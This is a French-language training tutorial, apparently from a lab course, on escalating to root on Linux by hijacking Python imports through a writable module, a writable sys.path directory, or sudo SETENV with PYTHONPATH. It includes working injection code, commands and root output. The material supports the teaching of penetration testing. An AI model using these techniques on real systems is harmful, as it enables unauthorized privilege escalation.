Piratage de la bibliothèque Python
==================================

* * * * *

Python est l'un des langages de programmation les plus populaires et les plus utilisés au monde et a déjà remplacé de nombreux autres langages de programmation dans l'industrie informatique. Il existe de très nombreuses raisons pour lesquelles Python est si populaire parmi les programmeurs. L'un d'eux est que les utilisateurs peuvent travailler avec une vaste collection de bibliothèques.

De nombreuses bibliothèques sont utilisées en Python et sont utilisées dans de nombreux domaines différents. L'un d'eux est [NumPy](https://numpy.org/doc/stable/) . `NumPy`est une extension open source pour Python. Le module fournit des fonctions précompilées pour l'analyse numérique. En particulier, il permet une manipulation aisée de listes et de matrices étendues. Cependant, il offre de nombreuses autres fonctionnalités essentielles, telles que des fonctions de génération de nombres aléatoires, de transformée de Fourier, d'algèbre linéaire et bien d'autres. De plus, NumPy fournit de nombreuses fonctions mathématiques pour travailler avec des tableaux et des matrices.

Une autre bibliothèque est [Pandas](https://pandas.pydata.org/docs/) . `Pandas`est une bibliothèque pour le traitement et l'analyse de données avec Python. Il étend Python avec des structures de données et des fonctions pour le traitement des tables de données. Une force particulière de Pandas est l'analyse des séries chronologiques. 

Python a [la bibliothèque standard Python](https://docs.python.org/3/library/) , avec de nombreux modules intégrés à partir d'une installation standard de Python. Ces modules fournissent de nombreuses solutions qui, autrement, devraient être laborieusement élaborées en écrivant nos programmes. Il y a d'innombrables heures de travail économisées ici si l'on a un aperçu des modules disponibles et de leurs possibilités. Le système modulaire est intégré dans cette forme pour des raisons de performances. Si l'on avait automatiquement toutes les possibilités immédiatement disponibles dans l'installation de base de Python sans importer le module correspondant, la vitesse de tous les programmes Python en souffrirait grandement.

En Python, on peut importer des modules assez facilement :

#### Importation de modules

Code : Python

```
#!/usr/bin/env python3

# Method 1
import pandas

# Method 2
from pandas import *

# Method 3
from pandas import Series

```

Il existe de nombreuses façons de détourner une bibliothèque Python. Tout dépend du script et de son contenu lui-même. Cependant, il existe trois vulnérabilités de base où le piratage peut être utilisé :

1.  Autorisations d'écriture erronées
2.  Chemin de la bibliothèque
3.  Variable d'environnement PYTHONPATH

* * * * *

Autorisations d'écriture erronées
---------------------------------

Par exemple, nous pouvons imaginer que nous sommes dans l'hôte d'un développeur sur l'intranet de l'entreprise et que le développeur travaille avec python. Nous avons donc un total de trois composants qui sont connectés. Il s'agit du script python réel qui importe un module python et les privilèges du script ainsi que les autorisations du module.

L'un ou l'autre module python peut avoir des autorisations d'écriture définies pour tous les utilisateurs par erreur. Cela permet au module python d'être édité et manipulé afin que nous puissions insérer des commandes ou des fonctions qui produiront les résultats souhaités. Si des permissions `SUID`/ `SGID`ont été attribuées au script Python qui importe ce module, notre code sera automatiquement inclus.

Si nous examinons les autorisations définies du `mem_stats.py`script, nous pouvons voir qu'il a un `SUID`ensemble.

#### Script Python

  Script Python

```
htb-student@lpenix:~$ ls -l mem_stats.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_stats.py

```

Nous pouvons donc exécuter ce script avec les privilèges d'un autre utilisateur, dans notre cas, en tant que `root`. Nous avons également la permission de voir le script et de lire son contenu.

#### Script Python - Contenu

Code : Python

```
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")

```

Ce script est donc assez simple et n'affiche que la mémoire virtuelle disponible en pourcentage. Nous pouvons également voir dans la deuxième ligne que ce script importe le module `psutil`et utilise la fonction `virtual_memory()`.

Nous pouvons donc rechercher cette fonction dans le dossier de `psutil`et vérifier si ce module a des autorisations d'écriture pour nous.

#### Autorisations des modules

  Autorisations des modules

```
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():

htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

```

Ces autorisations sont plus courantes dans les environnements de développement où de nombreux développeurs travaillent sur différents scripts et peuvent nécessiter des privilèges plus élevés.

#### Contenu des modules

Code : Python

```
...SNIP...

def virtual_memory():

	...SNIP...

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...

```

C'est la partie de la bibliothèque où nous pouvons insérer notre code. Il est recommandé de le mettre juste au début de la fonction. Nous pouvons y insérer tout ce que nous considérons comme correct et efficace. Nous pouvons importer le module `os`à des fins de test, ce qui nous permet d'exécuter des commandes système. Avec cela, nous pouvons insérer la commande `id`et vérifier lors de l'exécution du script si le code inséré est exécuté.

#### Contenu du module - Piratage

Code : Python

```
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...

```

Nous pouvons maintenant exécuter le script avec `sudo`et vérifier si nous obtenons le résultat souhaité.

#### Escalade des privilèges

  Escalade des privilèges

```
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%

```

Succès. Comme nous pouvons le voir à partir du résultat ci-dessus, nous avons réussi à détourner la bibliothèque et à faire exécuter notre code à l'intérieur de la `virtual_memory()`fonction en tant que `root`. Maintenant que nous avons le résultat souhaité, nous pouvons à nouveau éditer la bibliothèque, mais cette fois, insérez un shell inversé qui se connecte à notre hôte en tant que `root`.

* * * * *

Chemin de la bibliothèque
-------------------------

En Python, chaque version a un ordre spécifié dans lequel les bibliothèques ( `modules`) sont recherchées et importées. L'ordre dans lequel Python importe `modules`depuis est basé sur un système de priorité, ce qui signifie que les chemins situés en haut de la liste sont prioritaires sur ceux situés en bas de la liste. Nous pouvons le voir en lançant la commande suivante :

#### Liste PYTHONPATH

  Liste PYTHONPATH

```
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages

```

Pour pouvoir utiliser cette variante, deux prérequis sont nécessaires.

1.  Le module importé par le script se trouve sous l'un des chemins de priorité inférieure répertoriés via la `PYTHONPATH`variable.
2.  Nous devons avoir des autorisations d'écriture sur l'un des chemins ayant une priorité plus élevée sur la liste.

Par conséquent, si le module importé se trouve dans un chemin plus bas dans la liste et qu'un chemin de priorité supérieure est modifiable par notre utilisateur, nous pouvons créer nous-mêmes un module avec le même nom et inclure nos propres fonctions souhaitées. Étant donné que le chemin de priorité la plus élevée est lu plus tôt et examiné pour le module en question, Python accède au premier hit qu'il trouve et l'importe avant d'atteindre le module d'origine et prévu.

Pour que cela ait un peu plus de sens, continuons avec l'exemple précédent et montrons comment cela peut être exploité. Auparavant, le `psutil`module était importé dans le `mem_stats.py`script. Nous pouvons voir `psutil`l'emplacement d'installation par défaut de en exécutant la commande suivante :

#### Emplacement d'installation par défaut de Psutil

  Emplacement d'installation par défaut de Psutil

```
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...

```

De cet exemple, nous pouvons voir qui `psutil`est installé dans le chemin suivant : `/usr/local/lib/python3.8/dist-packages`. À partir de notre liste précédente de la `PYTHONPATH`variable, nous avons un nombre raisonnable de répertoires parmi lesquels choisir pour voir s'il pourrait y avoir des erreurs de configuration dans l'environnement pour nous permettre `write`d'accéder à l'un d'entre eux. Vérifions.

#### Autorisations de répertoire mal configurées

  Autorisations de répertoire mal configurées

```
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...

```

Après avoir vérifié tous les répertoires répertoriés, il apparaît que `/usr/lib/python3.8`le chemin est mal configuré de manière à permettre à tout utilisateur d'y écrire. En recoupant avec les valeurs de la `PYTHONPATH`variable, nous pouvons voir que ce chemin est plus haut dans la liste que le chemin dans lequel `psutil`est installé. Essayons d'abuser de cette mauvaise configuration pour créer notre propre `psutil`module contenant notre propre `virtual_memory()`fonction malveillante dans le `/usr/lib/python3.8`répertoire.

#### Contenu du module piraté - psutil.py

Code : Python

```
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')

```

Pour arriver à ce point, nous devons créer un fichier appelé `psutil.py`contenant le contenu répertorié ci-dessus dans le répertoire mentionné précédemment. Il est très important que nous nous assurons que le module que nous créons a le même nom que l'import ainsi que la même fonction avec le nombre correct d'arguments qui lui sont transmis que la fonction que nous avons l'intention de détourner. Ceci est essentiel car sans l'une ou l'autre de ces conditions `true`, nous ne pourrons pas effectuer cette attaque. Après avoir créé ce fichier contenant l'exemple de notre précédent script de piratage, nous avons préparé avec succès le système pour l'exploitation.

Exécutons à nouveau le `mem_status.py`script en utilisant `sudo`comme dans l'exemple précédent.

#### Escalade des privilèges via le piratage du chemin de la bibliothèque Python

  Escalade des privilèges via le piratage du chemin de la bibliothèque Python

```
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_stats.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_stats.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available'

```

Comme nous pouvons le voir sur la sortie, nous avons réussi à obtenir l'exécution en `root`détournant le chemin du module via une mauvaise configuration dans les autorisations du `/usr/lib/python3.8`répertoire.

* * * * *

Variable d'environnement PYTHONPATH
-----------------------------------

Dans la section précédente, nous avons abordé le terme `PYTHONPATH`, cependant, nous n'avons pas entièrement expliqué son utilisation et son importance concernant la fonctionnalité de Python. `PYTHONPATH`est une variable d'environnement qui indique dans quel répertoire (ou répertoires) Python peut rechercher les modules à importer. Ceci est important car si un utilisateur est autorisé à manipuler et à définir cette variable lors de l'exécution du binaire python, il peut efficacement rediriger la fonctionnalité de recherche de Python vers un `user-defined`emplacement lorsque vient le temps d'importer des modules. Nous pouvons voir si nous avons les autorisations pour définir des variables d'environnement pour le binaire python en vérifiant nos `sudo`autorisations :

#### Vérification des autorisations sudo

  Vérification des autorisations sudo

```
htb-student@lpenix:~$ sudo -l

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3

```

Comme nous pouvons le voir dans l'exemple, nous sommes autorisés à exécuter `/usr/bin/python3`sous les autorisations de confiance de `sudo`et sommes donc autorisés à définir des variables d'environnement à utiliser avec ce binaire en `SETENV:`définissant l'indicateur. Il est important de noter qu'en raison de la nature fiable de `sudo`, toutes les variables d'environnement définies avant d'appeler le binaire ne sont soumises à aucune restriction concernant la possibilité de définir des variables d'environnement sur le système. Cela signifie qu'en utilisant le `/usr/bin/python3`binaire, nous pouvons définir efficacement toutes les variables d'environnement dans le contexte de notre programme en cours d'exécution. Essayons de le faire maintenant en utilisant le `psutil.py`script de la dernière section.

#### Escalade de privilèges à l'aide de la variable d'environnement PYTHONPATH

  Escalade de privilèges à l'aide de la variable d'environnement PYTHONPATH

```
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_stats.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...

```

Dans cet exemple, nous avons déplacé le script python précédent du `/usr/lib/python3.8`répertoire vers `/tmp`. À partir de là, nous appelons à nouveau `/usr/bin/python3`run `mem_stats.py`, cependant, nous spécifions que la `PYTHONPATH`variable contient le `/tmp`répertoire afin qu'elle oblige Python à rechercher dans ce répertoire le `psutil`module à importer. Comme nous pouvons le voir, nous avons une fois de plus exécuté avec succès notre script dans le contexte de root.
